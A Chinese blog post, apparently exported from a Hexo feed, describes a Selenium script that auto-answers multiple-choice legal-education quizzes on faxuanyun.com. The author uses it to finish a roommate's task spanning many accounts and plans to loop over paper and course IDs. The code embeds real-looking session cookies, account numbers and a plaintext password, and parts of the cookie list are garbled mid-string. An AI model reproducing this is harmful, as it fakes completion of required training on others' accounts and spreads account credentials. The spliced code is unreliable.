alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-AvO4hG4M-1636167944702)(C:\Users\ASUS\Desktop\web刷题\图片\QQ截图20211106110345.png)]"></p><p>拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫-完成舍友的任务需求</title>
      <link href="/2021/11/04/pa-chong-wan-cheng-she-you-de-xu-yao-ren-wu/"/>
      <url>/2021/11/04/pa-chong-wan-cheng-she-you-de-xu-yao-ren-wu/</url>
      
        <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景:"></a>背景:</h3><blockquote><p>为了帮舍友 完成某个任务,首先这个任务是这样的（嘿嘿 可以白嫖一顿大餐)</p></blockquote><blockquote><p> 简单说一下就是有好多人 每人呢有好多套题,本身是有答案的,我们要做的就是完成这上百套题.</p><p> 首先题目是这样的 有单选有多选有判断<br> 截一小段来看, 自动化yyds  速度可以再提<br> <img src="https://img-blog.csdnimg.cn/842bc1201a524e578011236191fa9729.gif" alt="在这里插入图片描述"></p></blockquote><pre class="line-numbers language-none"><code class="language-none">这里拿单选来说1、(单选题)B村村长金某某，群众基础非常好，在村民中威信很高。在B村委会换届投票选举过程中，为稳妥当选村长，金某某采用贿赂选民、请选民吃喝等手段让选民为其投票，最终当选村民委员会主任。下列表述正确的是（）。 A.金某某的行为侵犯了本村选民自由行使选举权和被选举权 B.金某某的行为构成破坏选举罪 C.选举权和被选举权是人身自由权 D.金某某当选村长属于结果正义，选举有效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/559d3a2b2c0e4fe0a3a2b580868c9767.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p><blockquote><p>嗯,之前学过python 爬虫 那正好可以活学活用了</p></blockquote><p>说干就干.</p><pre class="line-numbers language-none"><code class="language-none">复习了一下 写了一个半自动化脚本  就是 还得需要点第几套 ,手动提交还需要一个隐性等待 这里时间紧迫 过几天会再补充上先用着 &gt; 这里cookie 为了安全就删了   大家用的话需要大家自己弄cookie注释中有获取的代码 ![请添加图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;0dcfaaef702c4fe98e6ec40adce730c5.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初级版</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>wait <span class="token keyword">import</span> WebDriverWait<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support <span class="token keyword">import</span> expected_conditions <span class="token keyword">as</span> EC<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">import</span> timediver<span class="token operator">=</span>webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>executable_path<span class="token operator">=</span><span class="token string">"D:\Chromdriver\chromedriver_win32\chromedriver2.exe"</span><span class="token punctuation">)</span>diver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.faxuanyun.com'</span><span class="token punctuation">)</span><span class="token comment"># time.sleep(2)</span><span class="token comment"># diver.find_element_by_id('userAccount').send_keys('')</span><span class="token comment"># diver.find_element_by_id('userPassword').send_keys()</span><span class="token comment">#</span><span class="token comment"># diver.implicitly_wait(30)</span><span class="token comment"># time.sleep(7)</span><span class="token comment"># diver.find_element_by_class_name('inpLogin').click()</span><span class="token comment"># time.sleep(2)</span><span class="token comment"># print(diver.get_cookies())</span><span class="token comment"># diver.find_element_by_id('userPassword').send_keys('')</span><span class="token comment"># diver.find_element_by_id('confPwd').send_keys('')</span>cookiie<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'userTypeFog'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'%221%22'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'passwordLevel'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'expiry'</span><span class="token punctuation">:</span> <span class="token number">1636041599</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'loginUser'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'%7B%22userAccount%22%3A%22370903008%2C%22roleId%22%3A%227%22%2C%22domainCode%22%3A%22100027008003008%22%2C%22rankId%22%3A%22241%22%2C%22lockFlag%22%3A%220%22%2C%22areaCode%22%3A%22370000%22%2C%22id%22%3A%2235371722%22%2C%22sid%22%3A%22a78c20b879404146a60ce1e55ad11188%22%2C%22politicsCode%22%3A%22p00%22%2C%22onlineTime%22%3A1636014282000%7D'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'_qddab'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> F1636016084<span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'_qdda'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'3-1.1'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'rid'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'9bb636d3d539c04b175e4f7aa26d810c'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'bindType'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'expiry'</span><span class="token punctuation">:</span> <span class="token number">1667550284</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'_qddaz'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'QD.791236014271840'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'expiry'</span><span class="token punctuation">:</span> <span class="token number">1667550271</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> Fayun<span class="token punctuation">.</span>com<span class="token string">'&#125;, &#123;'</span>domain<span class="token string">': '</span>www<span class="token punctuation">.</span>faxuanyun<span class="token punctuation">.</span>com<span class="token string">', '</span>expiry<span class="token string">': 1636041599, '</span>httpOnly<span class="token string">': False, '</span>name<span class="token string">': '</span>area<span class="token string">', '</span>path<span class="token string">': '</span><span class="token operator">/</span><span class="token string">', '</span>secure<span class="token string">': False, '</span>value<span class="token string">': '</span><span class="token operator">%</span><span class="token number">22000000</span><span class="token operator">%</span><span class="token number">22</span><span class="token string">'&#125;, &#123;'</span>domain<span class="token string">': '</span><span class="token punctuation">.</span>www<span class="token punctuation">.</span>faxuanyun<span class="token punctuation">.</span>com<span class="token string">', '</span>httpOnly<span class="token string">': False, '</span>name<span class="token string">': '</span>Hm_lpvt_183898d755583f6b54c8491f9c451ef5<span class="token string">', '</span>path<span class="token string">': '</span><span class="token operator">/</span><span class="token string">', '</span>secure<span class="token string">': False, '</span>value<span class="token string">': '</span><span class="token number">163601</span><span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'RmbUser'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'%7B%22RmbUser%22%3Afalse%2C%22userAccount%22%3A%223709030080066%22%2C%22userPassword%22%3A%22888888%22%7D'</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token keyword">for</span> item <span class="token keyword">in</span> cookiie<span class="token punctuation">:</span>    diver<span class="token punctuation">.</span>add_cookie<span class="token punctuation">(</span>item<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#diver.get('http://www.faxuanyun.com/sps/exercises/t/exercies_3_t.html?id=5191&amp;paperName=%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E4%B9%A0%E8%BF%91%E5%B9%B3%E6%B3%95%E6%B2%BB%E6%80%9D%E6%83%B3%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98&amp;status=0&amp;loginUserAccount=3709030080066&amp;courseId=4427')</span>diver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.faxuanyun.com/sps/exercises/t/exercies_3_t.html?id=5192&amp;paperName=%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E5%AE%AA%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98&amp;status=0&amp;loginUserAccount=3709030080065&amp;courseId=4428'</span><span class="token punctuation">)</span>diver<span class="token punctuation">.</span>maximize_window<span class="token punctuation">(</span><span class="token punctuation">)</span>diver<span class="token punctuation">.</span>refresh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#第一套题答案</span>answer_1_1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span>answer_1_2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'ABD'</span><span class="token punctuation">,</span><span class="token string">'AC'</span><span class="token punctuation">,</span><span class="token string">'ABCD'</span><span class="token punctuation">,</span><span class="token string">'AD'</span><span class="token punctuation">,</span><span class="token string">'AC'</span><span class="token punctuation">]</span>answer_1_3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token comment">#第二套答案</span><span class="token comment"># diver.find_element_by_id('userPassword').send_keys('')</span><span class="token comment"># diver.find_element_by_id('confPwd').send_keys('')</span><span class="token comment">#</span><span class="token comment"># diver.find_element_by_id('nextbtnForPwd').click()</span><span class="token comment"># time.sleep(2)</span><span class="token comment"># diver.find_element_by_id('ignore').click()</span><span class="token comment"># time.sleep(2)</span><span class="token comment"># diver.find_element_by_id('popalertConfirm').click()</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//div[@id='timucontent']//input[@type='radio'][@value='&#123;0&#125;']"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>answer_1_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//a[@onclick='sps.next()']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> answer_1_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>        diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//div[@id='timucontent']//input[@type='checkbox'][@value='&#123;0&#125;']"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//a[@onclick='sps.next()']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//div[@id='timucontent']//input[@type='radio'][@value='&#123;0&#125;']"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>answer_1_3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//a[@onclick='sps.next()']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>diver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//div[@class='clear']//a[@href='javascript:sps.myCommit();']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="升级版"><a href="#升级版" class="headerlink" title="升级版"></a>升级版</h3><p>我们观察每个url特征 发现只有标题, 还有题目的序号有变化</p><p>比如这里</p><blockquote><p>不同账号比较这个urlencode 可以解码解码则可以发现就是标题在发生变化 那末在人数折磨多的情况下我们则可以用lie表进行存储到时候直接调用即可</p></blockquote><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;5191&amp;paperName&#x3D;%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E4%B9%A0%E8%BF%91%E5%B9%B3%E6%B3%95%E6%B2%BB%E6%80%9D%E6%83%B3%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98&amp;status&#x3D;0&amp;loginUserAccount&#x3D;3709030080071&amp;courseId&#x3D;4427?id&#x3D;5192&amp;paperName&#x3D;%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E6%B0%91%E6%B3%95%E5%85%B8%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98&amp;status&#x3D;0&amp;loginUserAccount&#x3D;3709030080071&amp;courseId&#x3D;4429<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>同一个账号比较再观察一下其他变化的地方发现courseId 和 id 值发生变化 而且长度是8 那末我们 遍历即可</p></blockquote><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;5191&amp;paperName&#x3D;%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E4%B9%A0%E8%BF%91%E5%B9%B3%E6%B3%95%E6%B2%BB%E6%80%9D%E6%83%B3%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98&amp;status&#x3D;0&amp;loginUserAccount&#x3D;3709030080071&amp;courseId&#x3D;4427http:&#x2F;&#x2F;www.faxuanyun.com&#x2F;sps&#x2F;exercises&#x2F;t&#x2F;exercies_3_t.html?id&#x3D;5192&amp;paperName&#x3D;%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E6%B0%91%E6%B3%95%E5%85%B8%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98&amp;status&#x3D;0&amp;loginUserAccount&#x3D;3709030080071&amp;courseId&#x3D;4429<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#脚本如下</span><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">import</span> timediver<span class="token operator">=</span>webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>executable_path<span class="token operator">=</span><span class="token string">"D:\Chromdriver\chromedriver_win32\chromedriver2.exe"</span><span class="token punctuation">)</span>diver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.faxuanyun.com'</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># diver.find_element_by_id('userAccount').send_keys('')</span><span class="token comment"># diver.find_element_by_id('userPassword').send_keys()</span><span class="token comment">#</span><span class="token comment"># #diver.implicitly_wait(30)</span><span class="token comment"># time.sleep(7)</span><span class="token comment"># diver.find_element_by_class_name('loginBtn').click()</span><span class="token comment"># time.sleep(2)</span><span class="token comment"># print(diver.get_cookies())</span>title<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E4%B9%A0%E8%BF%91%E5%B9%B3%E6%B3%95%E6%B2%BB%E6%80%9D%E6%83%B3%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98'</span><span class="token punctuation">,</span><span class="token string">'%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E5%AE%AA%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98'</span><span class="token punctuation">,</span><span class="token string">'%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E6%B0%91%E6%B3%95%E5%85%B8%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98'</span><span class="token punctuation">,</span><span class="token string">'%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E5%85%9A%E5%86%85%E6%B3%95%E8%A7%84%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98'</span><span class="token punctuation">,</span><span class="token string">'%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E7%96%AB%E6%83%85%E9%98%B2%E6%8E%A7%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98'</span><span class="token punctuation">,</span><span class="token string">'%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E5%88%91%E4%BA%8B%E6%B2%BB%E5%AE%89%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98'</span><span class="token punctuation">,</span><span class="token string">'%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E4%BF%A1%E8%AE%BF%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98'</span><span class="token punctuation">,</span><span class="token string">'%E6%B7%84%E5%8D%9A%E5%B8%82%E6%B3%95%E5%BE%8B%E6%98%8E%E7%99%BD%E4%BA%BA%E6%B3%95%E6%B2%BB%E5%B8%A6%E5%A4%B4%E4%BA%BA%20%E4%BA%BA%E6%B0%91%E8%B0%83%E8%A7%A3%E5%AD%A6%E4%B9%A0%E4%B8%93%E9%A2%98'</span><span class="token punctuation">]</span>url_<span class="token operator">=</span><span class="token string">'http://www.faxuanyun.com/sps/exercises/t/exercies_3_t.html?id=&#123;0&#125;&amp;paperName=&#123;1&#125;&amp;status=0&amp;loginUserAccount=3709030080077&amp;courseId=&#123;2&#125;'</span>cookiie<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Hm_lpvt_183898d755583f6b54c8491f9c451ef5'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'1636032218'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'.www.faxuanyun.com'</span><span class="token punctuation">,</span> <span class="token string">'expiry'</span><span class="token punctuation">:</span> <span class="token number">1667568217</span><span class="token punctuation">,</span> <span class="token string">'httpOnly'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Hm_lvt_183898d755583f6b54c8491f9c451ef5'</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'secure'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token string">'1636032218'</span><span class="token punctuation">&#125;</span><span class="token 